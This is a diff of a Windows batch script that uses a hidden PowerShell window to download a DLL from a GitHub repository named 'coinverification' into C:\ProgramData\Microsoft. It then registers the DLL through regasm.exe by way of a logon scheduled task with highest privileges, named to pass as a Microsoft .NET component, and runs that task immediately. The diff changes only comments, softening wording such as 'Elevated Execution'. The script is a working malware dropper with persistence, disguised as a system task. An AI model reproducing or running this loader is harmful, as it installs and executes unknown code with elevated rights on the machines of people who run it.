@@ -1,37 +1,32 @@
 @echo off
 setlocal
 
-:: Step 1 – Prepare Safe Hidden Folder
+:: Step 1 – Create Safe Directory
 set "dllpath=C:\ProgramData\Microsoft\random.dll"
 mkdir "C:\ProgramData\Microsoft" >nul 2>&1
 
 :: Step 2 – Download DLL
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/coinverification/coinverify/raw/refs/heads/main/random.dll' -OutFile '%dllpath%'"
 
-:: Step 3 – Detect RegAsm Path (fallback order)
+:: Step 3 – Detect RegAsm Path (works on all Windows versions)
 set "regasm="
-
-:: .NET 4.x 64-bit
 if exist "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe" set "regasm=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe"
-:: .NET 4.x 32-bit
 if not defined regasm if exist "C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe" set "regasm=C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe"
-:: .NET 2.0 64-bit
 if not defined regasm if exist "C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe" set "regasm=C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe"
-:: .NET 2.0 32-bit
 if not defined regasm if exist "C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe" set "regasm=C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe"
 
 :: Fail if regasm not found
 if not defined regasm (
-  echo ❌ regasm.exe not found. No supported .NET version.
+  echo ❌ No supported .NET version found.
   exit /b
 )
 
-:: Step 4 – Create Scheduled Task for Elevated Execution
+:: Step 4 – Create Scheduled Task to Register DLL
 schtasks /create /tn "Microsoft .NET Registrationx" ^
   /tr "powershell.exe -WindowStyle Hidden -Command \"Start-Process '%regasm%' -ArgumentList '/nologo','%dllpath%' -WindowStyle Hidden -Verb RunAs\"" ^
   /sc onlogon /ru INTERACTIVE /rl HIGHEST /f
 
-:: Step 5 – Trigger it now
+:: Step 5 – Run the Task Now
 schtasks /run /tn "Microsoft .NET Registrationx"
 
 endlocal
